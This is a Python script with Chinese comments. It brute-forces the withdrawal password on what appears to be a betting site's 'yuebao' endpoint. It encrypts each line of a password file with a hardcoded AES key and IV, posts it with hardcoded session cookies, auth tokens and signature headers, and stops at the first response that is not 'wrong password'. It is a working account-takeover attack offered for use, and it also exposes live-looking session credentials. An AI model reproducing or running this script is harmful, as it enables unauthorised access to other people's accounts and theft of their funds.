import requests
import base64
import hashlib
import time
from Crypto.Cipher import AES


class DeAesCrypt:
    """
    AES-128-CBC解密
    """

    def __init__(self, key=None, iv=None, pad="zero"):
        """
        :param data: 加密后的字符串
        :param key: 随机的16位字符
        :param pad: 填充方式
        """
        self.key = key.encode("utf-8")
        # self.data = data
        self.pad = pad.lower()

        hash_obj = hashlib.md5()  # 构造md5对象
        hash_obj.update(key.encode())  # 进行md5加密,md5只能对byte类型进行加密
        res_md5 = hash_obj.hexdigest()  # 获取加密后的字符串数据
        self.iv = iv.encode("utf-8")

    def zeropadding(self, text):
        while len(text) % 16 != 0:
            text += '\0'
        return str.encode(text)

    def decrypt_aes(self, data):
        """AES-128-CBC解密"""
        # real_data = base64.b64decode(self.data)
        real_data = base64.b64decode(data)
        my_aes = AES.new(self.key, AES.MODE_CBC, self.iv)
        decrypt_data = my_aes.decrypt(real_data)
        print(decrypt_data)
        return self.get_str(decrypt_data)

    def encyrpt_aes(self, data):
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        content_padding = self.zeropadding(data)
        # 加密
        encrypt_bytes = cipher.encrypt(content_padding)
        # 重新编码
        result = str(base64.b64encode(encrypt_bytes), encoding='utf-8')
        return result

    def get_str(self, bd):
        """解密后的数据去除加密前添加的数据"""
        if self.pad == "zero":  # 去掉数据在转化前不足16位长度时添加的ASCII码为0编号的二进制字符
            return ''.join([chr(i) for i in bd if i != 0])

        # elif self.pad == "pkcs7":  # 去掉pkcs7模式中添加后面的字符
        #     return ''.join([chr(i) for i in i > 32])  # 此处报错，在我环境

        else:
            return "不存在此种数据填充方式"


cookies = {
    'session_sslproxy_server': 'c8b0f2da-77e3-4f05e699d5913eb4aeef7dc31a14acd84bbc',
    'UserKey': 'povwEaSHnAXR3qwBL6FIyebuXEwjsOXyw9fHuoIoY1ai7TQr3-srLVGdOz6CEmMU',
    '_vid_t': '+IFdqGv/k9g+N4uKOWlnRajYlYNaxcIl72dkfDFXwlJZ5LS4nM/XSm+Oct83GD34sNA/txKf2x9slA==',
}

headers = {
    'authority': 'www.4424477.com',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'zh',
    'auth': 'GlujAuANnovQpQOSUQcFtqc769ivyZ1B_Yq1quUxNge7205tY0oOgvMeqMcu70UKSU4tnZVgMMKUFa7kfRjsH4OHVGd8Mkb4g5OmdQDmr01ZV57siUIlpFl8mc2k1CECw8jfpfJFlkIft_XdNDarbud2Shadp4i4q926U4tkSsI0RA-pjgS-MZZ1OYCNRoGvcqg2vDhlGtUb7AWr-PSIRuvaqOYpE-XmgUyfj6MmS5Yx0iaCckWsusxCthDObzVYteoswyb7wBn-POBf-PYdsxKh8CO2zTLSrYXXtlAH8fjohmwnk2QaXbSlV6QhmI5ZEV_wDjm-HlX1T0wO6w8CuQ',
    'browserfingerid': 'SWZS2wpfkd0K8ySSUbaa',
    'clienttimezone': 'UTC+8',
    'content-type': 'text/plain',
    # 'cookie': 'session_sslproxy_server=c8b0f2da-77e3-4f05e699d5913eb4aeef7dc31a14acd84bbc; UserKey=povwEaSHnAXR3qwBL6FIyebuXEwjsOXyw9fHuoIoY1ai7TQr3-srLVGdOz6CEmMU; _vid_t=+IFdqGv/k9g+N4uKOWlnRajYlYNaxcIl72dkfDFXwlJZ5LS4nM/XSm+Oct83GD34sNA/txKf2x9slA==',
    'currency': 'CNY',
    'data-uuid': 'data-uuid-41',
    'device': '657c402a-39cf-47ad-bc30-eb96fbcae2b6',
    'devicemodel': 'windows',
    'domain': 'www.4424477.com',
    'language': 'zh',
    'nonce': '99177925-44b9-4946-b2b1-0c165c051ed8',
    'origin': 'https://www.4424477.com',
    'platformtype': '5',
    'referer': 'https://www.4424477.com/home/yuebao?id=18538137',
    'sec-ch-ua': '"Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'sign': 'tizCVGKpjENPFVZX6hx3MWr4EbYEPfkMGIBGX9/lsUDTkrnmHExurBb75X+nbxn/',
    'sitecode': '128',
    'timestamp': '1679234551',
    'token': '811c734efc0e9bdb97f41679234540806740774',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
    'x-request-id': '99177925-44b9-4946-b2b1-0c165c051ed8',
}

# data = 'EnySdAsslemHSkmy5lP5GXc3eR8xDjGE9sGijAjnG1jaIMmZK71OoqeOrrN3exwhXIL1YkAZF1iJ0GXlRufwSg=='

# response = requests.post('https://www.4424477.com/hall/yuebao/takeoutGold', cookies=cookies, headers=headers, data=data)
# print(response.json())
if __name__ == '__main__':
    data = 'EnySdAsslemHSkmy5lP5GXc3eR8xDjGE9sGijAjnG1jaIMmZK71OoqeOrrN3exwhXIL1YkAZF1iJ0GXlRufwSg=='
    # key = "8325b1d23ff2eeb4"
    key = "6ac7977dbcc1d526"
    iv = "5421698523412578"
    aes_obj = DeAesCrypt(key, iv)
    # ddd = aes_obj.decrypt_aes(data)
    with open("pass.txt", "r") as f:
        i = 0
        for content in f.readlines():
            try:
                i += 1
                data = aes_obj.encyrpt_aes(content)
                response = requests.post('https://www.4424477.com/hall/yuebao/takeoutGold', cookies=cookies,
                                         headers=headers, data=data)
                res = response.json()
                if i == 10000:
                    print("到哪了:", i, data, content)
                if "密码不正确" == res.get("msg") or res.get("errorCode") == 41080:
                    continue
                else:
                    print(content, res, data)
                    break

            except Exception as e:
                print(str(e), "到那了:", content, data)
                time.sleep(10)
                continue
